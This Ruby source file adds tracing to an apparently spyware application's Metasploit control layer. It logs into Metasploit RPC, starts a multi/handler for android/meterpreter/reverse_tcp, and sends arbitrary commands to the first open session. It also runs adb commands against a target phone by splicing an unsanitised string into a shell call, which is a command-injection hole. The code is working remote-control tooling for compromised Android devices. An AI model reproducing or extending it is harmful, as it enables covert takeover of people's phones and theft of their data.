# frozen_string_literal: true

require 'msfrpc-client'
require 'date'
require_relative '../lib/spyware_tracing'

module MsfInstrumentation
  def self.initialize_msf_tracing
    SpywareTracing.initialize_tracing
  end

  class InstrumentedMsfRpcClient
    def initialize(options = {})
      @tracer = SpywareTracing.tracer
      @client_options = options
      @rpc_client = nil
    end

    def login(username, password)
      SpywareTracing.trace_rpc_call('login', { user: username }) do |span|
        begin
          @rpc_client = Msf::RPC::Client.new(@client_options)
          result = @rpc_client.login(username, password)
          span.set_attribute('login.success', true)
          span.set_attribute('login.user', username)
          result
        rescue => e
          SpywareTracing.record_error(span, e, 'msf_login')
          raise
        end
      end
    end

    def call(method_name, *args)
      SpywareTracing.trace_rpc_call(method_name, { args_count: args.length }) do |span|
        begin
          result = @rpc_client.call(method_name, *args)
          span.set_attribute("rpc.result.type", result.class.name)
          
          # Log specific operations
          if method_name.include?('session')
            span.set_attribute('operation.category', 'session_management')
          elsif method_name.include?('module')
            span.set_attribute('operation.category', 'module_execution')
          elsif method_name.include?('exploit')
            span.set_attribute('operation.category', 'exploit')
          end
          
          result
        rescue => e
          SpywareTracing.record_error(span, e, "rpc_call_#{method_name}")
          raise
        end
      end
    end

    def logout
      SpywareTracing.trace_rpc_call('logout') do |span|
        begin
          @rpc_client.logout if @rpc_client
          span.set_attribute('logout.success', true)
        rescue => e
          SpywareTracing.record_error(span, e, 'msf_logout')
          raise
        end
      end
    end
  end

  module ApplicationControllerMixin
    def start_msf_process_traced(command)
      SpywareTracing.trace_session_command('active_session', command) do |span|
        begin
          @@nrRunningProcesses += 1
          user = ENV['MSF_RPC_USER'] || raise('MSF RPC username not configured (MSF_RPC_USER)')
          password = ENV['MSF_RPC_PASSWORD'] || raise('MSF RPC password not configured (MSF_RPC_PASSWORD)')
          options = {
            host: ENV['RAILS_HOST'],
            port: 3333,
            uri: '/api/',
            ssl: true,
          }

          rpc_client = InstrumentedMsfRpcClient.new(options)
          rpc_client.login(user, password)
          
          SpywareTracing.trace_rpc_call('module.execute', { payload: 'android/meterpreter/reverse_tcp' }) do |module_span|
            payloadOptions = {
              'PAYLOAD' => 'android/meterpreter/reverse_tcp',
              'LHOST' => '0.0.0.0',
              'LPORT' => 4444,
            }
            job = rpc_client.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
            module_span.set_attribute('job.id', job.to_s)
          end

          SpywareTracing.trace_rpc_call('session.list') do |session_span|
            session = rpc_client.call('session.list').keys[0]
            session_span.set_attribute('session.id', session)
            
            commandOutput = rpc_client.call('session.meterpreter_write', session, command)
            sleep 4
            commandOutput = rpc_client.call('session.meterpreter_read', session).values()[0].split('\n')
            
            span.set_attribute('command.status', 'success')
            span.set_attribute('command.output.lines', commandOutput.length)
          end

          rpc_client.logout
          commandOutput
        rescue Msf::RPC::ServerException => e
          SpywareTracing.record_error(span, e, 'start_msf_process')
          'Operation Failed'
        rescue => e
          SpywareTracing.record_error(span, e, 'start_msf_process')
          'Operation Failed'
        ensure
          @@nrFinishedProcesses += 1
          @@nrRunningProcesses -= 1
        end
      end
    end

    def run_adb_command_traced(command)
      SpywareTracing.trace_adb_operation(command) do |span|
        begin
          sleep 1
          @@nrRunningProcesses += 1
          commandOutput = `adb -H #{ENV['ADB_HOST']} -s #{@@adbTarget} #{command}`
          span.set_attribute('adb.command.status', 'success')
          span.set_attribute('adb.output.size', commandOutput.length)
          commandOutput
        rescue => e
          SpywareTracing.record_error(span, e, 'run_adb_command')
          'Operation Failed'
        ensure
          @@nrFinishedProcesses += 1
          @@nrRunningProcesses -= 1
        end
      end
    end
  end
end
